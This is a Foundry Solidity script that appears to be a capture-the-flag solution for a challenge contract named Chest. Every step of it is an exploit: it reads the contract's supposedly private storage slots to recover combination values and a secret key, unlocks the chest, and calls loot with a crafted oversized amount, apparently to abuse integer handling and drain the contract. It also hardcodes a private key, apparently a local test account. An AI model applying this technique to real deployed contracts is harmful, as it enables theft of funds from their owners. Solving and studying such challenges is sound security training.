// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";

interface Setup {
    function TARGET() external view returns (Chest);
}

interface Chest {
    function unlock(uint256 _key) external;

    function loot(int256 _amount) external;
}

contract Solve is Script {
    Chest target;
    Setup setup = Setup(0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0); // Setup address
    address player;

    function setUp() external payable {
        // Private key
        player = vm.addr(
            0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
        );
        vm.startBroadcast(player);
    }

    function run() external {
        target = Chest(setup.TARGET());
        bytes32 startSlot = keccak256(abi.encode(uint256(0)));
        uint256 combination1 = uint256(
            vm.load(address(target), bytes32(uint256(startSlot)))
        );
        uint256 combination2 = uint256(
            vm.load(address(target), bytes32(uint256(startSlot) + 1))
        );

        console2.log("Combination 1: ", combination1);
        console2.log("Combination 2: ", combination2);
        address key = address(uint160((combination1 >> 86) | combination2));
        bytes32 slotKey = keccak256(abi.encode(key, uint256(1)));
        uint256 golden_key = uint256(vm.load(address(target), slotKey));
        console2.log("Golden key: ", golden_key);
        target.unlock(golden_key);
        target.loot((1 << 64) + 10_000);

        vm.stopBroadcast();
    }
}
